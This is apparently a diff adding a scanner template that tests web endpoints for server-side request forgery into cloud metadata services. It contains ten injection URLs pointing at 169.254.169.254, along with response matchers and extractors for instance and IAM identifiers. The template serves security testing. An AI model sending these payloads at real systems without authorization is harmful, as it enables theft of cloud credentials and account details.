@@ -1,0 +1,83 @@
+id: ssrf-internal-metadata
+
+info:
+  name: SSRF to Cloud Metadata Service Candidate
+  author: p3i
+  severity: high
+  description: >
+    Probes for Server-Side Request Forgery (SSRF) vulnerabilities that can reach
+    cloud provider metadata services. SSRF to the metadata service (169.254.169.254
+    for AWS/GCP/Azure, 100.100.100.200 for Alibaba Cloud) allows an attacker to
+    retrieve: IAM role credentials (AWS access key, secret key, session token),
+    instance identity documents revealing cloud account IDs and region, user-data
+    scripts that often contain credentials or bootstrap secrets, and in some
+    configurations, service account tokens (GCP). This template tests URL parameters
+    commonly used as SSRF injection points by injecting metadata service URLs.
+    Detection is based on cloud-provider-specific content in the response.
+  reference:
+    - https://portswigger.net/web-security/ssrf
+    - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
+  tags: ssrf,aws,gcp,azure,metadata,cloud,credentials,iam
+  metadata:
+    max-request: 10
+
+http:
+  - method: GET
+    path:
+      # AWS/GCP/Azure IMDSv1 (no auth required)
+      - "{{BaseURL}}/api/proxy?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/load?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/webhook?target=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/download?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/redirect?to=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/curl?q=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/request?endpoint=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/fetch?endpoint=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/request?url=http://169.254.169.254/latest/meta-data/"
+
+    headers:
+      Accept: "application/json,text/plain,*/*"
+
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      # AWS EC2 metadata response
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam/security-credentials"
+          - "placement/availability-zone"
+          - "local-hostname"
+          - "public-hostname"
+          - "meta-data"
+          - "computeMetadata"
+          - "instance_id"
+          - "project-id"
+
+      - type: dsl
+        dsl:
+          - >-
+            contains(body, 'ami-id') ||
+            contains(body, 'instance-id') ||
+            contains(body, 'iam/security-credentials') ||
+            contains(body, 'computeMetadata') ||
+            contains(body, 'placement/availability-zone') ||
+            contains(body, 'local-hostname')
+          - "!contains(tolower(body), '<html') && !contains(tolower(body), '<!doctype')"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(ami-[a-z0-9]{8,17}|i-[a-f0-9]{8,17})"
+          - "(?i)(arn:aws:[a-z0-9:/_-]+)"
+          - "(?i)placement/availability-zone[^\n]*"
